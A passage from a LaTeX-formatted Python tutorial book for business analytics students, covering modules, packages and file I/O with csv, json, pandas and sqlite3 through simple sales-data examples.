  \hyperref[best-practices-for-using-modules]{Best Practices for Using
  Modules}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{What is a Python Module?}\label{what-is-a-python-module}

A Python module is a file containing Python definitions and statements.
Modules can define functions, classes, and variables. They can also
include runnable code. Grouping related code into a module makes the
code easier to understand and use.

\section{Creating a Module}\label{creating-a-module}

Creating a module in Python is simple. Just save your code in a
\texttt{.py} file.

\textbf{Example: \texttt{math\_operations.py}}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{def}\NormalTok{ add(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{+}\NormalTok{ b}

\KeywordTok{def}\NormalTok{ subtract(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{{-}}\NormalTok{ b}

\KeywordTok{def}\NormalTok{ multiply(a, b):}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{*}\NormalTok{ b}

\KeywordTok{def}\NormalTok{ divide(a, b):}
    \ControlFlowTok{if}\NormalTok{ b }\OperatorTok{==} \DecValTok{0}\NormalTok{:}
        \ControlFlowTok{raise} \PreprocessorTok{ValueError}\NormalTok{(}\StringTok{"Cannot divide by zero."}\NormalTok{)}
    \ControlFlowTok{return}\NormalTok{ a }\OperatorTok{/}\NormalTok{ b}
\end{Highlighting}
\end{Shaded}

\section{Importing a Module}\label{importing-a-module}

To use the functions and variables in a module, you need to import the
module into your script.

\textbf{Example: Importing \texttt{math\_operations.py}}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ math\_operations}

\BuiltInTok{print}\NormalTok{(math\_operations.add(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(math\_operations.subtract(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(math\_operations.multiply(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(math\_operations.divide(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

You can also import specific functions or variables from a module.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ math\_operations }\ImportTok{import}\NormalTok{ add, subtract}

\BuiltInTok{print}\NormalTok{(add(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(subtract(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{The \texttt{\_\_name\_\_}
Variable}{The \_\_name\_\_ Variable}}\label{the-__name__-variable}

The \texttt{\_\_name\_\_} variable is a special built-in variable in
Python. It gets its value depending on how the script is executed. If
the script is run directly, \texttt{\_\_name\_\_} is set to
\texttt{"\_\_main\_\_"}. If the script is imported as a module,
\texttt{\_\_name\_\_} is set to the module's name.

\textbf{Example: Using \texttt{\_\_name\_\_}}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# save as my\_module.py}
\KeywordTok{def}\NormalTok{ main():}
    \BuiltInTok{print}\NormalTok{(}\StringTok{"This is the main function."}\NormalTok{)}

\ControlFlowTok{if} \VariableTok{\_\_name\_\_} \OperatorTok{==} \StringTok{"\_\_main\_\_"}\NormalTok{:}
\NormalTok{    main()}
\end{Highlighting}
\end{Shaded}

\textbf{Example: Importing \texttt{my\_module.py}}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ my\_module}

\CommentTok{\# This will not print "This is the main function." because \_\_name\_\_ is not "\_\_main\_\_"}
\end{Highlighting}
\end{Shaded}

\section{Creating a Package}\label{creating-a-package}

A package is a way of organizing related modules into a directory
hierarchy. A package is simply a directory containing an
\texttt{\_\_init\_\_.py} file and one or more module files.

\textbf{Example: Directory Structure}

\begin{verbatim}
my_package/
    __init__.py
    math_operations.py
    string_operations.py
\end{verbatim}

\section{Importing from a Package}\label{importing-from-a-package}

You can import modules from a package using the \texttt{import}
statement.

\textbf{Example: Importing from a Package}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ my\_package }\ImportTok{import}\NormalTok{ math\_operations}

\BuiltInTok{print}\NormalTok{(math\_operations.add(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\section{\texorpdfstring{Using
\texttt{\_\_init\_\_.py}}{Using \_\_init\_\_.py}}\label{using-__init__.py}

The \texttt{\_\_init\_\_.py} file is used to initialize a Python
package. It can be empty or contain initialization code for the package.

\textbf{Example: \texttt{\_\_init\_\_.py}}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# This file can be empty or contain initialization code}
\end{Highlighting}
\end{Shaded}

\textbf{Example: Using \texttt{\_\_init\_\_.py} to Simplify Imports}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# my\_package/\_\_init\_\_.py}
\ImportTok{from}\NormalTok{ .math\_operations }\ImportTok{import}\NormalTok{ add, subtract, multiply, divide}
\ImportTok{from}\NormalTok{ .string\_operations }\ImportTok{import}\NormalTok{ uppercase, lowercase}
\end{Highlighting}
\end{Shaded}

Now you can import directly from \texttt{my\_package}:

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{from}\NormalTok{ my\_package }\ImportTok{import}\NormalTok{ add, uppercase}

\BuiltInTok{print}\NormalTok{(add(}\DecValTok{10}\NormalTok{, }\DecValTok{5}\NormalTok{))}
\BuiltInTok{print}\NormalTok{(uppercase(}\StringTok{"hello"}\NormalTok{))}
\end{Highlighting}
\end{Shaded}

\section{Practical Examples in BAIS}\label{practical-examples-in-bais-1}

\subsection{Data Analysis Module}\label{data-analysis-module}

\textbf{Example: \texttt{data\_analysis.py}}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\KeywordTok{def}\NormalTok{ calculate\_statistics(data):}
    \ControlFlowTok{return}\NormalTok{ \{}
        \StringTok{"mean"}\NormalTok{: data.mean(),}
        \StringTok{"median"}\NormalTok{: data.median(),}
        \StringTok{"std\_dev"}\NormalTok{: data.std()}
\NormalTok{    \}}

\KeywordTok{def}\NormalTok{ filter\_data(data, column, value):}
    \ControlFlowTok{return}\NormalTok{ data[data[column] }\OperatorTok{==}\NormalTok{ value]}
\end{Highlighting}
\end{Shaded}

\textbf{Usage:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ data\_analysis }\ImportTok{as}\NormalTok{ da}

\NormalTok{data }\OperatorTok{=}\NormalTok{ pd.DataFrame(\{}
    \StringTok{"sales"}\NormalTok{: [}\DecValTok{100}\NormalTok{, }\DecValTok{200}\NormalTok{, }\DecValTok{150}\NormalTok{, }\DecValTok{300}\NormalTok{, }\DecValTok{250}\NormalTok{],}
    \StringTok{"region"}\NormalTok{: [}\StringTok{"North"}\NormalTok{, }\StringTok{"South"}\NormalTok{, }\StringTok{"East"}\NormalTok{, }\StringTok{"West"}\NormalTok{, }\StringTok{"North"}\NormalTok{]}
\NormalTok{\})}

\NormalTok{stats }\OperatorTok{=}\NormalTok{ da.calculate\_statistics(data[}\StringTok{"sales"}\NormalTok{])}
\BuiltInTok{print}\NormalTok{(stats)}

\NormalTok{filtered\_data }\OperatorTok{=}\NormalTok{ da.filter\_data(data, }\StringTok{"region"}\NormalTok{, }\StringTok{"North"}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(filtered\_data)}
\end{Highlighting}
\end{Shaded}

\subsection{Data Visualization Module}\label{data-visualization-module}

\textbf{Example: \texttt{data\_visualization.py}}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ matplotlib.pyplot }\ImportTok{as}\NormalTok{ plt}

\KeywordTok{def}\NormalTok{ plot\_sales(data):}
\NormalTok{    plt.plot(data)}
\NormalTok{    plt.title(}\StringTok{"Sales Over Time"}\NormalTok{)}
\NormalTok{    plt.xlabel(}\StringTok{"Time"}\NormalTok{)}
\NormalTok{    plt.ylabel(}\StringTok{"Sales"}\NormalTok{)}
\NormalTok{    plt.show()}

\KeywordTok{def}\NormalTok{ plot\_bar\_chart(data, labels):}
\NormalTok{    plt.bar(labels, data)}
\NormalTok{    plt.title(}\StringTok{"Sales by Region"}\NormalTok{)}
\NormalTok{    plt.xlabel(}\StringTok{"Region"}\NormalTok{)}
\NormalTok{    plt.ylabel(}\StringTok{"Sales"}\NormalTok{)}
\NormalTok{    plt.show()}
\end{Highlighting}
\end{Shaded}

\textbf{Usage:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ data\_visualization }\ImportTok{as}\NormalTok{ dv}

\NormalTok{sales\_data }\OperatorTok{=}\NormalTok{ [}\DecValTok{100}\NormalTok{, }\DecValTok{200}\NormalTok{, }\DecValTok{150}\NormalTok{, }\DecValTok{300}\NormalTok{, }\DecValTok{250}\NormalTok{]}
\NormalTok{regions }\OperatorTok{=}\NormalTok{ [}\StringTok{"North"}\NormalTok{, }\StringTok{"South"}\NormalTok{, }\StringTok{"East"}\NormalTok{, }\StringTok{"West"}\NormalTok{, }\StringTok{"North"}\NormalTok{]}

\NormalTok{dv.plot\_sales(sales\_data)}
\NormalTok{dv.plot\_bar\_chart(sales\_data, regions)}
\end{Highlighting}
\end{Shaded}

\subsection{Database Interaction
Module}\label{database-interaction-module}

\textbf{Example: \texttt{database\_interaction.py}}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ sqlite3}

\KeywordTok{def}\NormalTok{ create\_connection(db\_file):}
\NormalTok{    conn }\OperatorTok{=}\NormalTok{ sqlite3.}\ExtensionTok{connect}\NormalTok{(db\_file)}
    \ControlFlowTok{return}\NormalTok{ conn}

\KeywordTok{def}\NormalTok{ create\_table(conn, create\_table\_sql):}
\NormalTok{    cursor }\OperatorTok{=}\NormalTok{ conn.cursor()}
\NormalTok{    cursor.execute(create\_table\_sql)}
\NormalTok{    conn.commit()}

\KeywordTok{def}\NormalTok{ insert\_data(conn, table, data):}
\NormalTok{    placeholders }\OperatorTok{=} \StringTok{", "}\NormalTok{.join(}\StringTok{"?"} \OperatorTok{*} \BuiltInTok{len}\NormalTok{(data))}
\NormalTok{    sql }\OperatorTok{=} \SpecialStringTok{f"INSERT INTO }\SpecialCharTok{\{}\NormalTok{table}\SpecialCharTok{\}}\SpecialStringTok{ VALUES (}\SpecialCharTok{\{}\NormalTok{placeholders}\SpecialCharTok{\}}\SpecialStringTok{)"}
\NormalTok{    cursor }\OperatorTok{=}\NormalTok{ conn.cursor()}
\NormalTok{    cursor.execute(sql, data)}
\NormalTok{    conn.commit()}

\KeywordTok{def}\NormalTok{ query\_data(conn, query):}
\NormalTok{    cursor }\OperatorTok{=}\NormalTok{ conn.cursor()}
\NormalTok{    cursor.execute(query)}
    \ControlFlowTok{return}\NormalTok{ cursor.fetchall()}
\end{Highlighting}
\end{Shaded}

\textbf{Usage:}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ database\_interaction }\ImportTok{as}\NormalTok{ db}

\NormalTok{conn }\OperatorTok{=}\NormalTok{ db.create\_connection(}\StringTok{"sales.db"}\NormalTok{)}

\NormalTok{create\_sales\_table }\OperatorTok{=} \StringTok{"""}
\StringTok{CREATE TABLE IF NOT EXISTS sales (}
\StringTok{    id INTEGER PRIMARY KEY,}
\StringTok{    region TEXT,}
\StringTok{    amount INTEGER}
\StringTok{)}
\StringTok{"""}
\NormalTok{db.create\_table(conn, create\_sales\_table)}

\NormalTok{db.insert\_data(conn, }\StringTok{"sales"}\NormalTok{, (}\DecValTok{1}\NormalTok{, }\StringTok{"North"}\NormalTok{, }\DecValTok{100}\NormalTok{))}
\NormalTok{db.insert\_data(conn, }\StringTok{"sales"}\NormalTok{, (}\DecValTok{2}\NormalTok{, }\StringTok{"South"}\NormalTok{, }\DecValTok{200}\NormalTok{))}

\NormalTok{results }\OperatorTok{=}\NormalTok{ db.query\_data(conn, }\StringTok{"SELECT * FROM sales"}\NormalTok{)}
\ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ results:}
    \BuiltInTok{print}\NormalTok{(row)}

\NormalTok{conn.close()}
\end{Highlighting}
\end{Shaded}

\section{Best Practices for Using
Modules}\label{best-practices-for-using-modules}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Modularity}: Break your code into smaller, reusable modules.
\item
  \textbf{Naming Conventions}: Use meaningful names for modules and
  functions.
\item
  \textbf{Documentation}: Include docstrings to document your functions
  and modules.
\item
  \textbf{Avoiding Circular Imports}: Be mindful of dependencies between
  modules to avoid circular imports.
\item
  \textbf{Testing}: Write tests for your modules to ensure they work as
  expected.
\item
  \textbf{Version Control}: Use version control (e.g., Git) to manage
  changes to your modules.
\end{enumerate}

\section{Conclusion}\label{conclusion-7}

This deep dive tutorial covered the fundamentals and advanced features
of Python modules, with practical examples in business analytics and
information systems (BAIS). Understanding how to create, import, and use
modules effectively is essential for writing modular, readable, and
maintainable code. Modules allow you to encapsulate logic, improve code
reuse, and manage complexity in your Python programs.

\bookmarksetup{startatroot}

\chapter{Introduction to Data Handling and File I/O in
Python}\label{introduction-to-data-handling-and-file-io-in-python}

Handling data and performing file input/output (I/O) operations are
fundamental tasks in any programming language. Python provides robust
tools and libraries to manage data storage, read and write files, and
manipulate different file formats. This tutorial will cover reading and
writing files in Python, managing data storage, and performing
operations on files using libraries such as \texttt{pandas},
\texttt{csv}, and \texttt{json}.

\subsection{Reading and Writing Text
Files}\label{reading-and-writing-text-files}

Text files are the most basic form of file handling in Python. You can
use built-in functions to read from and write to text files.

\subsubsection{Reading Text Files}\label{reading-text-files}

To read a text file, you use the \texttt{open} function in read mode
(\texttt{\textquotesingle{}r\textquotesingle{}}).

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Read a text file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    content }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
    \BuiltInTok{print}\NormalTok{(content)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Writing Text Files}\label{writing-text-files}

To write to a text file, you use the \texttt{open} function in write
mode (\texttt{\textquotesingle{}w\textquotesingle{}}).

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Write to a text file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}example.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}Hello, World!\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Handling CSV Files}\label{handling-csv-files}

CSV (Comma-Separated Values) files are commonly used to store tabular
data. Python provides the \texttt{csv} module to handle CSV files.

\subsubsection{Reading CSV Files}\label{reading-csv-files}

You can read a CSV file using the \texttt{csv.reader} function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ csv}

\CommentTok{\# Read a CSV file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    reader }\OperatorTok{=}\NormalTok{ csv.reader(}\BuiltInTok{file}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ reader:}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Writing CSV Files}\label{writing-csv-files}

You can write to a CSV file using the \texttt{csv.writer} function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ csv}

\CommentTok{\# Write to a CSV file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{, newline}\OperatorTok{=}\StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    writer }\OperatorTok{=}\NormalTok{ csv.writer(}\BuiltInTok{file}\NormalTok{)}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}Name\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Age\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}Department\textquotesingle{}}\NormalTok{])}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}John Doe\textquotesingle{}}\NormalTok{, }\DecValTok{30}\NormalTok{, }\StringTok{\textquotesingle{}Finance\textquotesingle{}}\NormalTok{])}
\NormalTok{    writer.writerow([}\StringTok{\textquotesingle{}Jane Smith\textquotesingle{}}\NormalTok{, }\DecValTok{25}\NormalTok{, }\StringTok{\textquotesingle{}Marketing\textquotesingle{}}\NormalTok{])}
\end{Highlighting}
\end{Shaded}

\subsection{Handling JSON Files}\label{handling-json-files}

JSON (JavaScript Object Notation) is a lightweight data-interchange
format. Python provides the \texttt{json} module to handle JSON files.

\subsubsection{Reading JSON Files}\label{reading-json-files}

You can read a JSON file using the \texttt{json.load} function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Read a JSON file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    data }\OperatorTok{=}\NormalTok{ json.load(}\BuiltInTok{file}\NormalTok{)}
    \BuiltInTok{print}\NormalTok{(data)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Writing JSON Files}\label{writing-json-files}

You can write to a JSON file using the \texttt{json.dump} function.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ json}

\CommentTok{\# Write to a JSON file}
\NormalTok{data }\OperatorTok{=}\NormalTok{ \{}
    \StringTok{\textquotesingle{}name\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}John Doe\textquotesingle{}}\NormalTok{,}
    \StringTok{\textquotesingle{}age\textquotesingle{}}\NormalTok{: }\DecValTok{30}\NormalTok{,}
    \StringTok{\textquotesingle{}department\textquotesingle{}}\NormalTok{: }\StringTok{\textquotesingle{}Finance\textquotesingle{}}
\NormalTok{\}}

\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    json.dump(data, }\BuiltInTok{file}\NormalTok{, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Data Manipulation with
Pandas}\label{data-manipulation-with-pandas}

Pandas is a powerful data manipulation library in Python. It provides
data structures and functions needed to manipulate structured data
seamlessly.

\subsubsection{Reading CSV Files with
Pandas}\label{reading-csv-files-with-pandas}

You can read a CSV file into a DataFrame using
\texttt{pandas.read\_csv}.

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Read a CSV file into a DataFrame}
\NormalTok{df }\OperatorTok{=}\NormalTok{ pd.read\_csv(}\StringTok{\textquotesingle{}data.csv\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(df)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Writing CSV Files with
Pandas}\label{writing-csv-files-with-pandas}

You can write a DataFrame to a CSV file using
\texttt{DataFrame.to\_csv}.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Write a DataFrame to a CSV file}
\NormalTok{df.to\_csv(}\StringTok{\textquotesingle{}data\_output.csv\textquotesingle{}}\NormalTok{, index}\OperatorTok{=}\VariableTok{False}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Reading JSON Files with
Pandas}\label{reading-json-files-with-pandas}

You can read a JSON file into a DataFrame using
\texttt{pandas.read\_json}.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Read a JSON file into a DataFrame}
\NormalTok{df }\OperatorTok{=}\NormalTok{ pd.read\_json(}\StringTok{\textquotesingle{}data.json\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(df)}
\end{Highlighting}
\end{Shaded}

\subsubsection{Writing JSON Files with
Pandas}\label{writing-json-files-with-pandas}

You can write a DataFrame to a JSON file using
\texttt{DataFrame.to\_json}.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Write a DataFrame to a JSON file}
\NormalTok{df.to\_json(}\StringTok{\textquotesingle{}data\_output.json\textquotesingle{}}\NormalTok{, orient}\OperatorTok{=}\StringTok{\textquotesingle{}records\textquotesingle{}}\NormalTok{, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Example: Processing Sales
Data}\label{example-processing-sales-data}

Let's combine these concepts to read sales data from a CSV file,
manipulate it using Pandas, and then save the results to a JSON file.

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \textbf{Read Sales Data from a CSV File}
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ pandas }\ImportTok{as}\NormalTok{ pd}

\CommentTok{\# Read sales data from a CSV file}
\NormalTok{sales\_df }\OperatorTok{=}\NormalTok{ pd.read\_csv(}\StringTok{\textquotesingle{}sales\_data.csv\textquotesingle{}}\NormalTok{)}
\BuiltInTok{print}\NormalTok{(sales\_df)}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{1}
\tightlist
\item
  \textbf{Manipulate Data}
\end{enumerate}

Calculate the total sales for each product.

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Calculate total sales for each product}
\NormalTok{sales\_df[}\StringTok{\textquotesingle{}Total Sales\textquotesingle{}}\NormalTok{] }\OperatorTok{=}\NormalTok{ sales\_df[}\StringTok{\textquotesingle{}Quantity\textquotesingle{}}\NormalTok{] }\OperatorTok{*}\NormalTok{ sales\_df[}\StringTok{\textquotesingle{}Unit Price\textquotesingle{}}\NormalTok{]}
\BuiltInTok{print}\NormalTok{(sales\_df)}
\end{Highlighting}
\end{Shaded}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\setcounter{enumi}{2}
\tightlist
\item
  \textbf{Write the Results to a JSON File}
\end{enumerate}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Write the results to a JSON file}
\NormalTok{sales\_df.to\_json(}\StringTok{\textquotesingle{}sales\_data\_output.json\textquotesingle{}}\NormalTok{, orient}\OperatorTok{=}\StringTok{\textquotesingle{}records\textquotesingle{}}\NormalTok{, indent}\OperatorTok{=}\DecValTok{4}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\subsection{Conclusion}\label{conclusion-8}

Handling data and performing file I/O operations are crucial skills for
any programmer. Python's built-in functions and libraries like
\texttt{pandas}, \texttt{csv}, and \texttt{json} make it easy to read,
write, and manipulate different file formats. By mastering these tools,
you can efficiently process data inputs and outputs in any system,
making your programs more powerful and versatile.

\bookmarksetup{startatroot}

\chapter{Deep Dive Tutorial on Python Data Handling and File I/O Using
Business Analytics and Information Systems
Examples}\label{deep-dive-tutorial-on-python-data-handling-and-file-io-using-business-analytics-and-information-systems-examples}

Data handling and file I/O (input/output) are critical skills in
business analytics and information systems (BAIS). This tutorial will
provide a deep dive into Python's data handling and file I/O
capabilities, demonstrating how to use these features with practical
BAIS examples.

\section{Table of Contents}\label{table-of-contents-4}

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  \hyperref[introduction-to-file-i-o]{Introduction to File I/O}
\item
  \hyperref[reading-and-writing-text-files]{Reading and Writing Text
  Files}
\item
  \hyperref[reading-and-writing-csv-files]{Reading and Writing CSV
  Files}
\item
  \hyperref[reading-and-writing-excel-files]{Reading and Writing Excel
  Files}
\item
  \hyperref[handling-json-data]{Handling JSON Data}
\item
  \hyperref[database-interaction]{Database Interaction}
\item
  \hyperref[working-with-large-data-sets]{Working with Large Data Sets}
\item
  \hyperref[practical-examples-in-bais]{Practical Examples in BAIS}

  \begin{itemize}
  \tightlist
  \item
    \hyperref[sales-data-analysis]{Sales Data Analysis}
  \item
    \hyperref[customer-data-management]{Customer Data Management}
  \end{itemize}
\item
  \hyperref[best-practices-for-data-handling-and-file-i-o]{Best
  Practices for Data Handling and File I/O}
\item
  \hyperref[conclusion]{Conclusion}
\end{enumerate}

\section{Introduction to File I/O}\label{introduction-to-file-io}

File I/O in Python involves reading from and writing to files. Python
provides built-in functions for file operations, making it easy to
handle various file types such as text, CSV, Excel, and JSON.

\section{Reading and Writing Text
Files}\label{reading-and-writing-text-files-1}

Text files are the simplest form of file I/O in Python.

\subsection{Reading Text Files}\label{reading-text-files-1}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Read entire file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    data }\OperatorTok{=} \BuiltInTok{file}\NormalTok{.read()}
    \BuiltInTok{print}\NormalTok{(data)}

\CommentTok{\# Read file line by line}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \ControlFlowTok{for}\NormalTok{ line }\KeywordTok{in} \BuiltInTok{file}\NormalTok{:}
        \BuiltInTok{print}\NormalTok{(line.strip())}
\end{Highlighting}
\end{Shaded}

\subsection{Writing Text Files}\label{writing-text-files-1}

\begin{Shaded}
\begin{Highlighting}[]
\CommentTok{\# Write to a file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}This is a line of text.}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}

\CommentTok{\# Append to a file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.txt\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}a\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
    \BuiltInTok{file}\NormalTok{.write(}\StringTok{\textquotesingle{}This is another line of text.}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)}
\end{Highlighting}
\end{Shaded}

\section{Reading and Writing CSV
Files}\label{reading-and-writing-csv-files}

CSV (Comma-Separated Values) files are commonly used for data storage
and exchange in business analytics.

\subsection{Reading CSV Files}\label{reading-csv-files-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ csv}

\CommentTok{\# Read CSV file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    reader }\OperatorTok{=}\NormalTok{ csv.reader(}\BuiltInTok{file}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ reader:}
        \BuiltInTok{print}\NormalTok{(row)}

\CommentTok{\# Read CSV file into a dictionary}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}data.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}r\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
\NormalTok{    reader }\OperatorTok{=}\NormalTok{ csv.DictReader(}\BuiltInTok{file}\NormalTok{)}
    \ControlFlowTok{for}\NormalTok{ row }\KeywordTok{in}\NormalTok{ reader:}
        \BuiltInTok{print}\NormalTok{(row)}
\end{Highlighting}
\end{Shaded}

\subsection{Writing CSV Files}\label{writing-csv-files-1}

\begin{Shaded}
\begin{Highlighting}[]
\ImportTok{import}\NormalTok{ csv}

\CommentTok{\# Write to a CSV file}
\ControlFlowTok{with} \BuiltInTok{open}\NormalTok{(}\StringTok{\textquotesingle{}output.csv\textquotesingle{}}\NormalTok{, }\StringTok{\textquotesingle{}w\textquotesingle{}}\NormalTok{, newline}\OperatorTok{=}\StringTok{\textquotesingle{}\textquotesingle{}}\NormalTok{) }\ImportTok{as} \BuiltInTok{file}\NormalTok{:}
